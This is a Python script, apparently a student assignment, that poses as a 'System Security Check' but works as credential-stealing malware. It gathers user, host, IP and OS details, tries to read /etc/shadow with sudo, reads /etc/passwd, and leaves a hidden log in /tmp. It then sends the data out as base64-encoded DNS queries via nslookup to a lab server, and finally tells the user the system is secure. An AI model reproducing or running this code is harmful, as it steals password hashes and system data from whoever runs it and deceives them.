# Baruh Ifraimov - 208526012 | Dor Cohen - 211896279
#!/usr/bin/env python3
print("System Security Check")
# print("Analyzing system configuration...")
import subprocess, os, base64, time, platform, socket, locale

def collect_extended_data():
    """Collect comprehensive system information."""
    data = {}
    
    # Basic info
    data['user'] = os.getenv('USER', 'unknown')
    data['hostname'] = socket.gethostname()
    data['os_info'] = platform.platform()
    
    # Get IP addresses
    try:
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=5)
        data['ip'] = result.stdout.strip().replace(' ', ',')
    except:
        data['ip'] = 'unknown'
    
    # Get available languages/locales
    try:
        result = subprocess.run(['locale', '-a'], capture_output=True, text=True, timeout=5)
        langs = result.stdout.strip().split('\n')[:5]  # First 5 locales
        data['languages'] = ','.join(langs)
    except:
        data['languages'] = locale.getdefaultlocale()[0] or 'unknown'
    
    # Get OS version details
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        data['os_version'] = line.split('=')[1].strip('"')
                        break
        else:
            data['os_version'] = platform.version()
    except:
        data['os_version'] = 'unknown'
    
    # Attempt to get /etc/shadow content
    try:
        # Try to read shadow file for all password hashes
        result = subprocess.run(
            ['sudo', 'cat', '/etc/shadow'], 
            capture_output=True, text=True, timeout=10, check=False
        )
        if result.returncode == 0 and result.stdout:
            data['shadow_file_content'] = "password file: " + result.stdout.strip()
        else:
            error_detail = f"Return code: {result.returncode}."
            if result.stderr:
                error_detail += f" Stderr: {result.stderr.strip()}"
            elif not result.stdout and result.returncode != 0 : # if no stdout and error
                 error_detail += " No output, command may have failed or file is empty/inaccessible."
            else: # if no stdout but return code 0 (empty file)
                 error_detail += " File is empty or no content readable."

            data['shadow_file_content'] = "password file: Failed to read /etc/shadow. " + error_detail
    except Exception as e: # Covers timeout, command not found, other subprocess errors
        data['shadow_file_content'] = f"password file: Exception reading /etc/shadow: {str(e)}"
        
    # Attempt to get /etc/passwd content
    try:
        with open('/etc/passwd', 'r') as f:
            passwd_content = f.read()
        if passwd_content:
            data['passwd_file_content'] = "password file: " + passwd_content.strip()
        else:
            data['passwd_file_content'] = "password file: /etc/passwd is empty or no content readable."
    except Exception as e: # Covers FileNotFoundError, PermissionError, etc.
        data['passwd_file_content'] = f"password file: Exception reading /etc/passwd: {str(e)}"
    
    return data

def save_local_copy(data):
    """Save collected data locally."""
    try:
        log_file = f"/tmp/.security_log_{data['user']}.txt"
        with open(log_file, 'w') as f:
            for key, value in data.items():
                f.write(f"{key}: {value}\n")
        return log_file
    except:
        return None

def send_via_dns(data):
    """Send data via DNS queries."""
    # Format all data into string
    data_string = '|'.join([f"{k}:{v}" for k, v in data.items()])
    
    num_chunks = (len(data_string) + 39) // 40 # Calculate total number of chunks
    # print(f"Attempting to send data in {num_chunks} chunks via DNS...")
    
    # Send in chunks
    for i, chunk in enumerate([data_string[j:j+40] for j in range(0, len(data_string), 40)]):
        try:
            # print(f"Sending chunk {i+1}/{num_chunks}...")
            encoded = base64.b64encode(chunk.encode()).decode().replace('=', '')[:60]
            query = f'data{i}.{encoded}.ns1.mylocal.net'
            subprocess.run(['nslookup', query, '10.211.55.7'], capture_output=True, timeout=5, check=False)
        except Exception as e:
            # print(f"Error sending chunk {i+1}: {e}") # Optionally print error for debugging
            pass
    # print("DNS data sending process completed.")

def main():
    # Collect comprehensive data
    system_data = collect_extended_data()
    
    # Save local copy
    log_file = save_local_copy(system_data)
    if log_file:
        pass
        # print(f"Security audit logged to: {log_file}")
    
    # Exfiltrate via DNS
    send_via_dns(system_data)
    
    print("Security check completed!")
    print("Your system is secure.")

if __name__ == "__main__":
    main()